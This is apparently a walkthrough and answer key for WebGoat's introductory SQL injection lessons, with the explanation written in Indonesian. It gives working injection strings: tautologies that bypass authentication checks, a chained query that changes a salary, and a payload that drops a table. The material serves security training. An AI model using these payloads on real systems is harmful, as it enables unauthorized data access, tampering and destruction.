# SQL Injection (intro)

Pelajaran ini menjelaskan apa itu Structured Query Language (SQL) dan bagaimana hal itu dapat dimanipulasi untuk melakukan tugas-tugas yang bukan merupakan maksud asli pengembang.

## What is SQL?
```sh
select department from employees where first_name='Bob' and last_name='Franco'
```

## Data Manipulation Language (DML) 
```sh
update employees set department = 'Sales' where first_name='Tobi' and last_name='Barnett'
```

## Data Definition Language (DDL)
```sh
alter table employees add phone varchar(20)
```

## Data Control Language (DCL)
```sh
grant all on grant_rights to unauthorized_user
```

## Try It! String SQL injection
- **Query:** "SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";
- Opsi 1: '
- Opsi 2: or
- Opsi 3: '1' = '1

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20intro/sql%20intro%201.JPG)

## Try It! Numeric SQL injection
- **Query:** "SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
- Login_Count: 1
- User_Id: 1 or 1=1

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20intro/sql%20intro%202.JPG)

## Compromising confidentiality with String SQL injection
- **Query:** "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
- Employee Name:
```sh
Smith
```
- Authentication TAN: 
```sh
1' or '1'='1
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20intro/sql%20intro%203.JPG)

## Compromising Integrity with Query chaining
- Employee Name:
```sh
Smith'; update employees set salary = 100000 where last_name='Smith' --
```
- Authentication TAN: 
```sh
3SL99A
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20intro/sql%20intro%204.JPG)

## Compromising Availability
- Action contains:
```sh
'; drop table access_log --
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20intro/sql%20intro%205.JPG)